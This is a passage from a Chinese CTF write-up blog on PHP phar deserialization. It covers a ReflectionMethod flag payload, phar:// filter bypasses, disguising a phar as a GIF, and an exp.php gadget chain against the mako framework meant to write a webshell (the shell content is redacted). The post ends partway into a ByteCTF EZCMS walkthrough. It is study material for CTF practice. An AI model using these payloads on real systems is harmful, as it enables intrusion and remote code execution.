<p>猜测flag在注释中</p>
<p>直接构造payload,即可得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>
<h3 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h3>
<p>phar反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<code>phar://伪协议</code>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4>
<p>首先了解一下phar文件的结构，一个phar文件由四部分构成：</p>
<ul>
<li>
<p>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
</li>
<li>
<p>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<strong>meta-data</strong>，这是上述攻击手法最核心的地方。</p>
</li>
<li>
<p>the file <strong>contents</strong>：被压缩文件的内容。</p>
</li>
<li>
<p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在末尾，用于确认phar文件完整性。</p>
</li>
</ul>
<h4 id="demo-2"><a class="markdownIt-Anchor" href="#demo-2"></a> Demo</h4>
<p>注：生成phar文件需要将php.ini中的phar.readonly选项设置为off，否则无法生成phar文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007152134587-166727395787412.png" alt="meta-data"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问之后就会生成phar.phar文件，打开查看，会看到meta-data是以序列化的形式存储的：</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007150717433-166727395787413.png" alt="meta-data"></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>filectime</th>
<th>file_exists</th>
<th>file_get_contents</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_put_conents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>实际上，只要调用了<code>php_stream_open_wrapper</code>的函数，都存在这样的问题，因此受影响的还有下列函数：</p>
<p><strong>exif</strong></p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom</code></li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<p><strong>file / url</strong></p>
<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>mime_content_type</code></li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p><strong>finfo</strong></p>
<ul>
<li><code>finfo_file</code></li>
<li><code>finfo_buffer</code></li>
</ul>
<p><strong>zip</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;TW.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span> -&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://phar.phar/***&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>Postgres</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host%s;dbname=%s;user=%s;password=%s;&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;postgres&quot;</span>,<span class="string">&quot;TW&quot;</span>,<span class="string">&#x27;123520&#x27;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;phar://phar.phar/aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="trick"><a class="markdownIt-Anchor" href="#trick"></a> Trick</h4>
<p>过滤了phar://协议，绕过姿势：</p>
<ul>
<li><code>compress.bzip2://phar://</code></li>
<li><code>compress.zlib://phar:///</code></li>
<li><code>php://filter/resource=phar://</code></li>
</ul>
<blockquote>
<p>同时，还可以将伪造phar为其他格式的文件。</p>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007234558245-166727395787414.png" alt="伪造"></p>
<p>理论到这就差不多了，接下来讲一个2022MT决赛的复现题目，讲不明白的话，师傅们记得锤我。</p>
<h4 id="漏洞条件"><a class="markdownIt-Anchor" href="#漏洞条件"></a> 漏洞条件</h4>
<p>1、phar文件能够上传至服务器<br>
即要求存在file_get_contents()、fopen()这种函数</p>
<p>2、要有可利用的魔术方法<br>
这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</p>
<p>3、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br>
一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是<code>Phar://</code>这种，如果这几个特殊字符被过滤就无法实现反序列化</p>
<h4 id="赛题复现"><a class="markdownIt-Anchor" href="#赛题复现"></a> 赛题复现</h4>
<h5 id="mtctf2022决赛"><a class="markdownIt-Anchor" href="#mtctf2022决赛"></a> <s>MTCTF2022决赛</s></h5>
<p>自己起了一个docker，我们先大概看一下题目吧。</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>文件上传先简单的传个文件抓个包看一下，</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>这里还没有去看源码，看到这个，就随便上传了一个码试了一下，发现图片上传后被发送到一个函数中处理。这里就意识到不是简单的文件上传了，决赛时也去啃源码了，但是没怎么啃明白，复现时间足够多，在加上Maxzed大师傅的wp总算啃明白了，源码太多，我就截重点来说吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里看Maxzed师傅的wp没看出来他怎么判断存在phar反序列化漏洞，这里自己又去细看了一下源码。</p>
<p><s>光看这个是没有任何思路的，再截一段重要的源码说一下，开讲前肯定吧源码发到群里了，师傅们有想法的可以自取。</s></p>
<p>按照phar反序列化的惯例就是要找可控的函数，那就找吧<s>审那么大一个玩意儿确实难受</s></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//每次循环中，当前数组元素的值被赋给 $fileName，当前数组元素的键名也会在每次循环中被赋给变量 $index。并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个数组元素），直到遍历到数组的末尾，停止遍历并退出循环。</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//对每次循环的fileName进行base64编码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//获取fileName的一个函数，这里是读取imageFile的文件名并赋值给fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//就这个函数，要是敏锐一些，应该就能猜到fileName可控，那么就要找触发点，接着审。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//可控的filename,这里可以用来触发phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里来说一下fileName为啥是可控的,在Image构造函数中存在file_exists()来触发，同时在ediGet中filename进行get访问，即可用来触发phar</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>那么接下来就是挖链子了，</p>
<p>初步审下来，我这里就直接用maxzed的链子了，我就解读一下他为啥会用这个链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>在Session.php中的__destruct(),具有自动提交会话数据的commit,数据传到File</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在File.write()中存在写入功能点，链子利用的就是这个，接着看下一个功能点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.php中的put()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>功能：把一个字符串写入文件中。</p>
<p>语法：<code>file_put_contents(file,data,mode,context)</code></p>
<p>参数说明：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td><em>data</em></td>
<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定文件句柄的环境。<em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略</td>
</tr>
</tbody>
</table>
<p>参数 <em>data</em> 可以是数组（但不能是多维数组）。</p>
<p>自 PHP 5.1.0 起，<em>data</em> 参数也可以被指定为 stream 资源，stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。</p>
<p>对 <em>context</em> 参数的支持是 PHP 5.0.0 添加的。</p>
<hr>
<p>这里就可以利用将我们想写入的数据写进容器中，理论成立，实践开始，我这里就直接用maxzed的exp啦，将shell写在/var/www/mako/public下。</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//由于要存本地，这个先和谐一下</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="string">//签名自动计算</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>接下来就是常规获取shell了，但是我自己本地搭的docker传上去的phar.phar没反应，没法读取，没能复现成功。<s>被迫换题说</s></p>
<h4 id="byte2019ezcms"><a class="markdownIt-Anchor" href="#byte2019ezcms"></a> Byte2019EZCMS</h4>
<p>题目靶场：[NSSCTF - <a href="https://www.ctfer.vip/problem/190">ByteCTF 2019]EZCMS (ctfer.vip)</a></p>
<p>题目考点：源码泄露、MD5长度攻击、phar反序列化</p>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<p>​      拿到题目，扫了一下目录，发现存在www.zip，访问www.zip获得源码 ，分析源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;u r not admin !!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;upload.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    这里就是，只要passwor不是admin都可以登录进去，但是登录进去却不能上传文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221009185109443-166727395787418.png" alt="test05"></p>
